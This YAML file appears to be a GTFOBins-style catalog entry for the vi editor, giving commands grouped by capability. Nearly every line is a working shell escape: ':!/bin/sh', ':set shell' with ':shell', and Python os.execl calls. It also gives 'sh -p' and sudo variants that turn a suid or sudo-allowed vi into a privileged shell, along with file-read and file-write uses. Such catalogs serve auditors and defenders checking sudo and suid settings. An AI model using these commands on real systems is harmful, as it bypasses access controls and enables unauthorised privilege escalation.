---
functions:
  shell:
    - code: vi -c ':!/bin/sh'
    - code: |
        vi
        :set shell=/bin/sh
        :shell
    - description: This requires that `vi` is compiled with Python support.
      code: vi -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
  file-write:
    - code: |
        vi file_to_write
        iDATA
        ^[
        w
  file-read:
    - code: vi file_to_read
  suid:
    - code: ./vi -c ':!/bin/sh -p'
    - description: This requires that `vi` is compiled with Python support.
      code: ./vi -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
  sudo:
    - code: sudo vi -c ':!/bin/sh'
    - description: This requires that `vi` is compiled with Python support.
      code: sudo vi -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
---
